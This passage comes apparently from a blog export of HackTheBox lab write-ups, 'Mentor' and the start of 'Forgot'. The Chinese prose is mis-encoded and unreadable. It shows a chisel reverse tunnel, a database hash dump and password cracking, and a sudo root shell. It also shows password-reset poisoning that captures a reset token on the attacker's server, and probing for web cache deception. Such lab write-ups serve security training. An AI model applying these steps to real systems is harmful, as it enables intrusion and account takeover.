ï¼ˆPSï¼šè¿™é‡Œçœ‹åˆ°é¶æœºIPä¸º10.129.89.191ï¼Œä¸ä¹‹å‰çš„10.10.11.193ä¸ä¸€è‡´ï¼Œæ˜¯å› ä¸ºé¶æœºä¸­é—´ç½‘ç»œä¸­æ–­ï¼Œæˆ‘åˆ‡æ¢è¿‡é¶æœºç¯å¢ƒï¼Œæœ¬è´¨ä¸Šä»–ä¿©éƒ½æ˜¯è¿™å°é¶æœºåœ°å€ï¼‰ å°†chiselå¤åˆ¶åˆ°/tmpæ–‡ä»¶å¤¹ä¸‹ï¼Œå¹¶æ·»åŠ å¯æ‰§è¡Œæƒé™ æœ¬åœ°æ‰§è¡Œï¼š chmod +x chisel ./chisel server --port 9899 --reverse é¶æœºæ‰§è¡Œï¼š chmod +x chisel ./chisel client -v 10.10.X.X:9899 R:5432:172.22.0.1:5432 è¿æ¥æ•°æ®åº“ï¼Œå¯†ç æ˜¯postgres â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# psql -h 10.10.X.X -U \"postgres\" -p 5432 Password for user postgres: psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1)) Type \"help\" for help. postgres=# \\list List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------------+----------+----------+------------+------------+----------------------- mentorquotes_db | postgres | UTF8 | en_US.utf8 | en_US.utf8 | postgres | postgres | UTF8 | en_US.utf8 | en_US.utf8 | template0 | postgres | UTF8 | en_US.utf8 | en_US.utf8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.utf8 | en_US.utf8 | =c/postgres + | | | | | postgres=CTc/postgres (4 rows) postgres=# \\c mentorquotes_db psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1)) You are now connected to database \"mentorquotes_db\" as user \"postgres\". mentorquotes_db=# \\d List of relations Schema | Name | Type | Owner --------+---------------+----------+---------- public | cmd_exec | table | postgres public | quotes | table | postgres public | quotes_id_seq | sequence | postgres public | users | table | postgres public | users_id_seq | sequence | postgres (5 rows) mentorquotes_db=# select * from users; id | email | username | password ----+------------------------+-------------+---------------------------------- 1 | james@mentorquotes.htb | james | 7ccdcd8c05b59add9c198d492b36a503 2 | svc@mentorquotes.htb | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8 4 | wa0er@mentorquotes.htb | james | ad4ece449e52f57769466a281720b825 5 | james@mentorquotes.htb | wa0er | ad4ece449e52f57769466a281720b825 6 | admin@mentorquotes.htb | admin | ad4ece449e52f57769466a281720b825 (5 rows) è·å–åˆ°ç”¨æˆ·å¯†ç hashå€¼ï¼Œåªæœ‰å‰ä¸¤ä¸ªæœ‰ç”¨ï¼Œåé¢çš„æ˜¯ä¹‹å‰è‡ªå·±æ·»åŠ çš„ ç ´è§£ä¸€ä¸‹https://crackstation.net/ å¾—åˆ°svcè´¦æˆ·çš„å¯†ç  123meunomeeivani ç™»å½•ssh â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh svc@10.10.11.193 svc@10.10.11.193's password: Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Mar 9 09:03:14 AM UTC 2023 System load: 0.0 Usage of /: 65.3% of 8.09GB Memory usage: 15% Swap usage: 0% Processes: 243 Users logged in: 0 IPv4 address for br-028c7a43f929: 172.20.0.1 IPv4 address for br-24ddaa1f3b47: 172.19.0.1 IPv4 address for br-3d63c18e314d: 172.21.0.1 IPv4 address for br-7d5c72654da7: 172.22.0.1 IPv4 address for br-a8a89c3bf6ff: 172.18.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.193 IPv6 address for eth0: dead:beef::250:56ff:feb9:d789 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40 svc@mentor:~$ id uid=1001(svc) gid=1001(svc) groups=1001(svc) svc@mentor:~$ pwd /home/svc æƒé™æå‡ä»æœ¬åœ°ä¼ ä¸€ä¸ªlinpeaså·¥å…·ï¼Œè¿è¡Œä¸€ä¸‹ï¼Œåˆ†æå¯çœ‹åˆ°æœ‰SNMPæœåŠ¡çš„ç›¸å…³é…ç½®æ–‡ä»¶ æŸ¥çœ‹/etc/snmp/snmpd.confï¼Œå¯çœ‹åˆ°æœ‰ä¸ªå¯†ç ï¼Œç«™ç‚¹å±ä¸»æ˜¯jamesï¼Œé‚£åº”è¯¥å°±æ˜¯jamesçš„å¯†ç ï¼ˆè¿™ä¸ªå¯†ç è·Ÿä¹‹å‰çš„å¯†ç ä¸ä¸€æ ·ï¼Œå¯èƒ½å‰é¢çš„é‚£ä¸ªåªæ˜¯å¹³å°jamesç®¡ç†å‘˜çš„å¯†ç ï¼Œè¿™ä¸ªåœ°æ–¹æ˜¯linuxç»ˆç«¯jamesç”¨æˆ·çš„å¯†ç ï¼‰ svc@mentor:/tmp$ cat /etc/snmp/snmpd.conf SuperSecurePassword123__ åˆ‡æ¢åˆ°jamesç”¨æˆ·ï¼Œæ‰§è¡Œsudo -lå¯çœ‹åˆ°jamesç”¨æˆ·æœ‰æ‰§è¡Œ/bin/shå‘½ä»¤çš„æƒé™ svc@mentor:/tmp$ su james Password: james@mentor:/tmp$ id uid=1000(james) gid=1000(james) groups=1000(james) james@mentor:/tmp$ sudo -l [sudo] password for james: Matching Defaults entries for james on mentor: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User james may run the following commands on mentor: (ALL) /bin/sh æ‰§è¡Œ/bin/shï¼ŒæˆåŠŸè·å–rootæƒé™ james@mentor:/tmp$ sudo /bin/sh # id uid=0(root) gid=0(root) groups=0(root) Overï¼ æ€»ç»“ ä¿¡æ¯æ”¶é›†å¾—åˆ°Swagger UIé¡µé¢ã€SNMPæœåŠ¡ã€è¯¸å¤šæœ‰æ•ˆç›®å½•ï¼› SNMPé…ç½®ä¿¡æ¯æ³„éœ²ç®¡ç†å‘˜jameså¯†ç ï¼› ç™»å½•jamesç”¨æˆ·è·å–ç®¡ç†å‘˜JWTï¼› åˆ©ç”¨ç®¡ç†å‘˜JWTå‘½ä»¤æ‰§è¡Œè·å–è™šæ‹Ÿrootæƒé™ï¼› å‘ç°PostgreSQLæ•°æ®åº“ï¼Œä¸ä¹‹äº¤äº’è·å–sshè´¦æˆ·ï¼› ç™»å½•sshè´¦æˆ·è¿è¡Œlinpeasï¼Œä»SNMPé…ç½®æ–‡ä»¶æ‹¿åˆ°jamesç»ˆç«¯å¯†ç ï¼› åˆ‡æ¢jamesç»ˆç«¯ç”¨æˆ·ï¼Œææƒè·å–rootæƒé™ã€‚ å‚è€ƒHackthebox Mentor Writeupï¼šhttps://0xdedinfosec.vercel.app/blog/hackthebox-mentor-writeup å®æˆ˜SNMPæœåŠ¡æ”»å‡»ï¼šhttps://www.freebuf.com/articles/network/319234.html","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Forgot","slug":"HTB3-Forgot","date":"2023-03-15T08:45:05.000Z","updated":"2023-08-31T07:55:17.332Z","comments":true,"path":"posts/7f4bdc86.html","link":"","permalink":"https://wa0er.github.io/posts/7f4bdc86.html","excerpt":"","text":"HTB-Forgotä¿¡æ¯æœé›†nmap â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sC -sV 10.10.11.188 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-06 02:21 EST Nmap scan report for 10.10.11.188 Host is up (0.62s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Werkzeug/2.1.2 Python/3.8.10 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 NOT FOUND | Server: Werkzeug/2.1.2 Python/3.8.10 | Date: Mon, 06 Mar 2023 07:20:37 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 207 | X-Varnish: 493857 493844 | Age: 71 | Via: 1.1 varnish (Varnish/6.2) | Connection: close | &lt;!doctype html&gt; | &lt;html lang=en&gt; | &lt;title&gt;404 Not Found&lt;/title&gt; | &lt;h1&gt;Not Found&lt;/h1&gt; | &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt; | GetRequest: | HTTP/1.1 302 FOUND | Server: Werkzeug/2.1.2 Python/3.8.10 | Date: Mon, 06 Mar 2023 07:21:38 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 219 | Location: http://127.0.0.1 | X-Varnish: 493852 | Age: 0 | Via: 1.1 varnish (Varnish/6.2) | Connection: close | &lt;!doctype html&gt; | &lt;html lang=en&gt; | &lt;title&gt;Redirecting...&lt;/title&gt; | &lt;h1&gt;Redirecting...&lt;/h1&gt; | &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=\"http://127.0.0.1\"&gt;http://127.0.0.1&lt;/a&gt;. If not, click the link. | HTTPOptions: | HTTP/1.1 200 OK | Server: Werkzeug/2.1.2 Python/3.8.10 | Date: Mon, 06 Mar 2023 07:21:40 GMT | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, GET, HEAD | Content-Length: 0 | X-Varnish: 264229 | Age: 0 | Via: 1.1 varnish (Varnish/6.2) | Accept-Ranges: bytes | Connection: close | RTSPRequest, SIPOptions: |_ HTTP/1.1 400 Bad Request |_http-server-header: Werkzeug/2.1.2 Python/3.8.10 |_http-title: Login 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.91%I=7%D=3/6%Time=64059482%P=x86_64-pc-linux-gnu%r(GetRe SF:quest,1E3,\"HTTP/1\\.1\\x20302\\x20FOUND\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20 SF:Python/3\\.8\\.10\\r\\nDate:\\x20Mon,\\x2006\\x20Mar\\x202023\\x2007:21:38\\x20GM SF:T\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2 SF:0219\\r\\nLocation:\\x20http://127\\.0\\.0\\.1\\r\\nX-Varnish:\\x20493852\\r\\nAge SF::\\x200\\r\\nVia:\\x201\\.1\\x20varnish\\x20\\(Varnish/6\\.2\\)\\r\\nConnection:\\x2 SF:0close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20lang=en&gt;\\n&lt;title&gt;Redirecting SF:\\.\\.\\.&lt;/title&gt;\\n&lt;h1&gt;Redirecting\\.\\.\\.&lt;/h1&gt;\\n&lt;p&gt;You\\x20should\\x20be\\x20r SF:edirected\\x20automatically\\x20to\\x20the\\x20target\\x20URL:\\x20&lt;a\\x20href SF:=\\\"http://127\\.0\\.0\\.1\\\"&gt;http://127\\.0\\.0\\.1&lt;/a&gt;\\.\\x20If\\x20not,\\x20cli SF:ck\\x20the\\x20link\\.\\n\")%r(HTTPOptions,118,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nSe SF:rver:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.8\\.10\\r\\nDate:\\x20Mon,\\x2006\\x20 SF:Mar\\x202023\\x2007:21:40\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charse SF:t=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20GET,\\x20HEAD\\r\\nContent-Length:\\x200\\r SF:\\nX-Varnish:\\x20264229\\r\\nAge:\\x200\\r\\nVia:\\x201\\.1\\x20varnish\\x20\\(Var SF:nish/6\\.2\\)\\r\\nAccept-Ranges:\\x20bytes\\r\\nConnection:\\x20close\\r\\n\\r\\n\" SF:)%r(RTSPRequest,1C,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\r\\n\")%r(Four SF:OhFourRequest,1C7,\"HTTP/1\\.1\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20Werkz SF:eug/2\\.1\\.2\\x20Python/3\\.8\\.10\\r\\nDate:\\x20Mon,\\x2006\\x20Mar\\x202023\\x2 SF:007:20:37\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nCon SF:tent-Length:\\x20207\\r\\nX-Varnish:\\x20493857\\x20493844\\r\\nAge:\\x2071\\r\\n SF:Via:\\x201\\.1\\x20varnish\\x20\\(Varnish/6\\.2\\)\\r\\nConnection:\\x20close\\r\\n SF:\\r\\n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20lang=en&gt;\\n&lt;title&gt;404\\x20Not\\x20Found&lt;/ SF:title&gt;\\n&lt;h1&gt;Not\\x20Found&lt;/h1&gt;\\n&lt;p&gt;The\\x20requested\\x20URL\\x20was\\x20not SF:\\x20found\\x20on\\x20the\\x20server\\.\\x20If\\x20you\\x20entered\\x20the\\x20UR SF:L\\x20manually\\x20please\\x20check\\x20your\\x20spelling\\x20and\\x20try\\x20a SF:gain\\.&lt;/p&gt;\\n\")%r(SIPOptions,1C,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\n\\ SF:r\\n\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 190.69 seconds å¼€æ”¾ç«¯å£ï¼š22ï¼ˆSSHï¼‰ã€80ï¼ˆHTTPï¼‰ï¼Œå¹¶ä¸”è§‚å¯Ÿåˆ°http-server-headeræ˜¯Werkzeug/2.1.2å’ŒPython/3.8.10ï¼Œé‚£ä¹ˆå°±ææœ‰å¯èƒ½æ˜¯Flaskæ¡†æ¶ è®¿é—®10.10.11.188ï¼Œæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œå¯ä»¥çˆ†ç ´ï¼Œä½†è¿™ä¸æ˜¯ä¸Šç­– æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°å¦‚ä¸‹æ³¨é‡Šå†…å®¹ æš´éœ²äº†ç”¨æˆ·robert-dev-14522ï¼Œè€Œä¸”åœ¨/staticç›®å½•åŠ è½½äº†å¾ˆå¤šjsæ–‡ä»¶ ç‚¹å‡»FOGOT THE PASSWORD?ï¼Œè·³è½¬åˆ°å¦‚ä¸‹/forogté¡µé¢ï¼Œéœ€è¦è¾“å…¥ç”¨æˆ·å è¾“å…¥adminï¼Œä¼šæç¤ºadminç”¨æˆ·çš„å¯†ç ä¸èƒ½è¢«é‡ç½® éšä¾¿è¾“å…¥å…¶ä»–ç”¨æˆ·åï¼Œä¼šæç¤ºæ— æ•ˆç”¨æˆ·å éšä¾¿è®¿é—®ä¸€ä¸ªç›®å½•ï¼Œ404é¡µé¢ googleä¸€ä¸‹404é¡µé¢å†…å®¹ï¼ŒåŸºæœ¬ç¡®å®šæ˜¯flaskæ¡†æ¶ ç”¨feroxbusterçˆ†ä¸€ä¸‹ç›®å½• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# feroxbuster -u http://10.10.11.188/ ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \"epi\" Risher ğŸ¤“ ver: 2.7.3 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ğŸ¯ Target Url â”‚ http://10.10.11.188/ ğŸš€ Threads â”‚ 50 ğŸ“– Wordlist â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt ğŸ‘Œ Status Codes â”‚ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] ğŸ’¥ Timeout (secs) â”‚ 7 ğŸ¦¡ User-Agent â”‚ feroxbuster/2.7.3 ğŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml ğŸ HTTP methods â”‚ [GET] ğŸ”ƒ Recursion Depth â”‚ 4 ğŸ‰ New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ğŸ Press [ENTER] to use the Scan Management Menuâ„¢ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 200 GET 246l 484w 5186c http://10.10.11.188/ 200 GET 246l 484w 5189c http://10.10.11.188/login 302 GET 5l 22w 189c http://10.10.11.188/home =&gt; http://10.10.11.188/ 302 GET 5l 22w 189c http://10.10.11.188/tickets =&gt; http://10.10.11.188/ 200 GET 253l 498w 5227c http://10.10.11.188/forgot 200 GET 261l 517w 5523c http://10.10.11.188/reset [####################] - 3m 30000/30000 0s found:6 errors:0 [####################] - 3m 30000/30000 154/s http://10.10.11.188/ äº”ä¸ªç›®å½•ï¼š/loginã€/homeã€/ticketsã€/forgotã€/reset /loginæ˜¯é»˜è®¤ç™»é™†é¡µé¢ï¼Œ/forgotåˆšè®¿é—®è¿‡ï¼Œ/homeå’Œ/ticketsä¼šé‡å®šå‘åˆ°ç™»é™†é¡µé¢ï¼Œé‚£å°±è¯•è¯•è®¿é—®/resetï¼Œå¯ä»¥è®¿é—®ï¼Œç›¸å½“äºè·³è¿‡äº†/forgoté¡µé¢è¾“å…¥ç”¨æˆ·åçš„è¿‡ç¨‹ éšä¾¿è¾“å…¥å¯†ç ï¼Œå‘ç°ä¼šæç¤ºæ— æ•ˆtokenï¼Œé‚£è¯´æ˜è¿˜æ˜¯è¦å›åˆ°/forgoté¡µé¢ï¼Œæƒ³åŠæ³•æ‹¿åˆ°token å›åˆ°/forgoté¡µé¢ï¼Œè¾“å…¥åˆšæ‰å‘ç°çš„ç”¨æˆ·årobert-dev-14522ï¼Œçœ‹æç¤ºï¼Œåº”è¯¥æ˜¯æœ‰æ•ˆç”¨æˆ·ï¼Œä½†é‡ç½®å¯†ç çš„é“¾æ¥å‘é€åˆ°ç”¨æˆ·æ”¶ä»¶ç®± é‡ç½®å¯†ç åŠŸèƒ½æŠ•æ¯’å‚è€ƒhttps://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning ç›˜ä¸€ç›˜é‡ç½®å¯†ç çš„é€»è¾‘ï¼š ç¬¬ä¸€æ­¥ï¼Œç”¨æˆ·è¾“å…¥ç”¨æˆ·åï¼Œæäº¤é‡ç½®å¯†ç è¯·æ±‚ï¼› ç¬¬äºŒæ­¥ï¼ŒæœåŠ¡å™¨æ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªä¸´æ—¶tokenï¼Œè¿å¸¦tokenè¿”å›ä¸€ä¸ªé‡ç½®å¯†ç çš„é“¾æ¥åˆ°ç”¨æˆ·çš„inboxï¼› ç¬¬ä¸‰æ­¥ï¼Œç”¨æˆ·è®¿é—®é‡ç½®å¯†ç é“¾æ¥ï¼ŒæœåŠ¡å™¨éªŒè¯tokenï¼Œtokenä¸€è‡´åˆ™å¯ä»¥é‡ç½®å¯†ç ï¼Œå¦åˆ™æç¤ºtokenæ— æ•ˆ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ­¥ï¼Œæˆªè·ç”¨æˆ·æäº¤çš„é‡ç½®å¯†ç è¯·æ±‚ï¼Œä¿®æ”¹HTTPå¤´éƒ¨Hostå­—æ®µå€¼ä¸ºæ”»å‡»æœºIPï¼Œç„¶ååœ¨æ”»å‡»æœºIPå¼€å¯httpæœåŠ¡ç›‘å¬ï¼Œå½“æœåŠ¡å™¨åšå®Œç¬¬äºŒæ­¥è¿”å›å¸¦tokençš„é‡ç½®å¯†ç çš„é“¾æ¥æ—¶ï¼Œæ”»å‡»æœºå°±å¯ä»¥æ”¶åˆ°æ­¤å“åº”ã€‚ æ”»å‡»æœºå¼€å¯ç›‘å¬ python3 -m http.server 80 ç”¨åˆšæ‰çš„robert-dev-14522ç”¨æˆ·é‡æ–°å‘é€é‡ç½®å¯†ç è¯·æ±‚ï¼Œæˆªè·è¯·æ±‚åŒ…ï¼Œä¿®æ”¹hostå­—æ®µä¸ºæœ¬åœ°ipï¼Œç‚¹å‡»send ç¨ç­‰ç‰‡åˆ»ï¼Œæˆ‘ä»¬å°±æ”¶åˆ°äº†æœåŠ¡å™¨çš„å“åº”ï¼Œæ˜¯ä¸ªå¸¦æœ‰tokençš„é‡ç½®å¯†ç URL â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.188 - - [06/Mar/2023 04:02:02] code 404, message File not found 10.10.11.188 - - [06/Mar/2023 04:02:02] \"GET /reset?token=ZSDRCRl0pCgor%2FJNZl%2BgMY%2FMKBEBlPFYJZSdq4Yiti3oiS6qX3ipoFp4wFP5zD1EFR6R4oD11M4ht8kJ0X8S3w%3D%3D HTTP/1.1\" 404 - æµè§ˆå™¨è®¿é—®å¸¦tokençš„é‡ç½®å¯†ç URLï¼Œå¯çœ‹åˆ°æˆåŠŸé‡ç½®å¯†ç  ç„¶åæˆåŠŸç™»å½•ä¸»é¡µé¢ï¼ŒæŸ¥çœ‹å„ä¸ªé¡µé¢ï¼Œå¤§è‡´å‰–æä¸€ä¸‹è¿™ç½‘ç«™åŠŸèƒ½ï¼šå°±æ˜¯ç½‘ç«™ç”¨æˆ·å¦‚æœé‡åˆ°ä¸€äº›æƒé™ç›¸å…³çš„é—®é¢˜æ—¶ï¼ˆæ¯”å¦‚æ— æ³•è®¿é—®æŸç«™ç‚¹ã€æƒ³åšä¸€äº›æ¯”è‡ªå·±æƒé™é«˜çš„äº‹æƒ…ï¼‰ï¼Œå¯ä»¥åœ¨[Escalate]é¡µé¢æäº¤ææƒç”³è¯·ï¼Œç„¶åTicketså°±ä¼šæ˜¾ç¤ºå„ä¸ªç”¨æˆ·æäº¤ç”³è¯·çš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨æˆ·å› ä¸ºä»€ä¹ˆé—®é¢˜éœ€è¦ææƒã€å“ªä¸ªç”¨æˆ·æäº¤çš„ã€è¯¥ç”¨æˆ·ç°åœ¨çš„æƒé™çŠ¶æ€æ˜¯æ€æ ·çš„ã€‚è¿™ä¸ªé€»è¾‘æ²¡ç›˜æ˜ç™½ï¼Œåé¢å¯èƒ½ä¼šä¸€å¤´é›¾æ°´ã€‚ ç‚¹å‡»Ticketsï¼Œå¯çœ‹åˆ°ä¸€ä¸ªè¡¨æ ¼ï¼Œè¡¨æ ¼æœ€åä¸€æ æ˜¾ç¤ºDiegoç”¨æˆ·çš„SSHå‡­è¯ä¸èƒ½ç”¨ï¼Œè€Œä¸”æ­¤ç”¨æˆ·æƒé™å·²è¢«æå‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯•å›¾æŸ¥çœ‹å·²è¢«ææƒçš„é¡µé¢[Tickets(escalated)] å´å‘ç°Tickets(escalated)æ— æ³•ç‚¹å‡»ï¼Œæœ‰ç‚¹å¯ç–‘ï¼ŒF12æŸ¥çœ‹æœ‰ç›®å½•/admin_ticketsï¼Œå·²ææƒçš„ç”¨æˆ·åº”è¯¥ç»™çš„æ˜¯adminæƒé™ï¼Œé‚£ä¹ˆDiegoç”¨æˆ·åº”è¯¥å°±è¢«æå‡åˆ°adminæƒé™äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä»¥adminèº«ä»½ç™»å½•ç½‘ç«™ï¼Œä»è€Œçœ‹åˆ°Diegoç”¨æˆ·çš„ç”¨æˆ·åå¯†ç ï¼Œä¹Ÿå°±æ˜¯SSHçš„ç”¨æˆ·åå¯†ç ã€‚F12æŠŠclasså€¼åˆ é™¤æˆ–è€…ç›´æ¥è®¿é—®/admin_ticketsç›®å½•éƒ½æ— æ•ˆï¼Œä¼šè·³è½¬åˆ°http://10.10.11.188/home?err=ACCESS_DENIED webç¼“å­˜æ¬ºéª—å›å¤´çœ‹nmapçš„æ‰«æç»“æœï¼ŒHTTPå“åº”æœ‰ä¸¤ä¸ªç½•è§çš„å­—æ®µX-Varnishå’ŒVia HTTP/1.1 200 OK Server: Werkzeug/2.1.2 Python/3.8.10 Date: Mon, 06 Mar 2023 07:21:40 GMT Content-Type: text/html; charset=utf-8 Allow: OPTIONS, GET, HEAD Content-Length: 0 X-Varnish: 264229 Age: 0 Via: 1.1 varnish (Varnish/6.2) Accept-Ranges: bytes Connection: close Varnishæ˜¯ä¸€ä¸ªç”¨ä½œç¼“å­˜çš„åå‘ä»£ç†ç¨‹åº X-Varnishæ˜¯Varnishç”Ÿæˆçš„IDå· Viaåœ¨æ­¤å¤„ç›¸å½“äºæŒ‡æ˜ç½‘ç«™æœåŠ¡ç”¨çš„HTTP/1.1å’ŒVarnish/6.2 å‚è€ƒhttps://labs.withsecure.com/advisories/plone-cms-cache-poisoning-xss-vulnerability å‰é¢åœ¨æºç çœ‹åˆ°ç½‘ç«™åœ¨/staticç›®å½•åŠ è½½äº†å¾ˆå¤šä¿¡æ¯ï¼Œè€Œä¸”æœ‰åå‘ä»£ç†Varnishä½œç¼“å­˜ï¼Œé‚£ä¹ˆå°±ç”¨curlæµ‹è¯•ä¸€ä¸‹HTTPå“åº”å¤´éƒ¨å­—æ®µï¼Œå¦‚ä¸‹ï¼Œå¯çœ‹åˆ°curl -I \"http://10.10.11.188/\"å“åº”å¤´æ— cache-controlå­—æ®µ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl -I \"http://10.10.11.188/\" HTTP/1.1 200 OK Server: Werkzeug/2.1.2 Python/3.8.10 Date: Tue, 07 Mar 2023 03:50:02 GMT Content-Type: text/html; charset=utf-8 Content-Length: 5186 X-Varnish: 596113 Age: 0 Via: 1.1 varnish (Varnish/6.2) Accept-Ranges: bytes Connection: keep-alive å¦‚ä¸‹ï¼Œcurl -I \"http://10.10.11.188/static/\"å“åº”å¤´æœ‰cache-controlå­—æ®µï¼Œè€Œä¸”è¯¥å­—æ®µè®¾ç½®çš„æƒé™æ˜¯publicï¼Œå³å¯å‘ä»»æ„æ–¹æä¾›ç¼“å­˜ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl -I \"http://10.10.11.188/static/\" HTTP/1.1 404 NOT FOUND Server: Werkzeug/2.1.2 Python/3.8.10 Date: Mon, 06 Mar 2023 14:44:46 GMT Content-Type: text/html; charset=utf-8 Content-Length: 207 cache-control: public, max-age=240 X-Varnish: 137222 1902052 Age: 47073 Via: 1.1 varnish (Varnish/6.2) Connection: keep-alive curl -I \"http://10.10.11.188/static/wa0er\"å“åº”å¤´æœ‰cache-controlå­—æ®µ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl -I \"http://10.10.11.188/static/wa0er\" HTTP/1.1 404 NOT FOUND Server: Werkzeug/2.1.2 Python/3.8.10 Date: Tue, 07 Mar 2023 03:49:24 GMT Content-Type: text/html; charset=utf-8 Content-Length: 207 cache-control: public, max-age=240 X-Varnish: 137236 Age: 0 Via: 1.1 varnish (Varnish/6.2) Connection: keep-alive ç»§ç»­æµ‹è¯•ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœ curl -I \"http://10.10.11.188/staticwa0er\" #æœ‰cache-controlå­—æ®µ curl -I \"http://10.10.11.188/wa0er/static\" #æœ‰cache-controlå­—æ®µ curl -I \"http://10.10.11.188/wa0erstatic\" #æ— cache-controlå­—æ®µ ç”±æ­¤æ¨æµ‹ï¼ŒVarnishåº”è¯¥æ˜¯åŒ¹é…â€/staticâ€å­—ç¬¦ä¸²ï¼ŒåŒ¹é…æˆåŠŸï¼Œåˆ™è¿”å›ç¼“å­˜ä¿¡æ¯ã€‚æˆ‘ä»¬è‚¯å®šæ²¡æ³•é€šè¿‡ç½‘ç«™æ­£å¸¸çš„æäº¤ææƒç”³è¯·çš„æµç¨‹å»è·å¾—adminæƒé™ï¼Œä½†çŸ¥é“ç”¨Varnishåšäº†ç¼“å­˜ï¼Œä¸”cache-controlå­—æ®µæœ‰publicï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•è¯»ç¼“å­˜ã€‚ åœ¨[Escalate]é¡µé¢ï¼ŒLinkå†…å®¹å¡«å†™å¸¦æœ‰/staticçš„URLï¼Œæäº¤ææƒç”³è¯· 